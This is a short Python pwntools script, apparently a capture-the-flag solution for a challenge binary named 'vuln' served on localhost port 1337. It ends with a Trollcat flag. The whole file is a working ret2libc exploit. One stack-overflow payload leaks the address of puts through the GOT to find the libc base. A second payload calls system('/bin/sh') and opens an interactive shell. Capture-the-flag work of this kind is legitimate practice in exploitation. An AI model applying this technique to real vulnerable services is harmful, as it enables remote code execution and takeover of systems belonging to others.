from pwn import *

elf = ELF("vuln")
libc = ELF("libc.so.6")

offset = 12
r = remote("localhost", 1337)

payload = b'A' * offset
payload += p32(elf.plt['puts'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['puts'])
r.sendlineafter("> ", "1")
r.sendline(payload)

r.sendlineafter("> ", "2")
r.sendline("B" * 32)
r.recvuntil("\n\n")

puts = u32(r.recv(4))
libc_base = puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
log.info("libc_base leaked --> %s", hex(libc_base))

payload = b'A' * offset
payload += p32(system)
payload += b"AAAA"
payload += p32(binsh)
r.sendlineafter("> ", "1")
r.sendline(payload)

r.sendlineafter("> ", "2")
r.sendline("B" * 32)
r.interactive()

# FLAG --> Trollcat{h4ck3rs_d0nt_n33d_b4d_th0ghts}
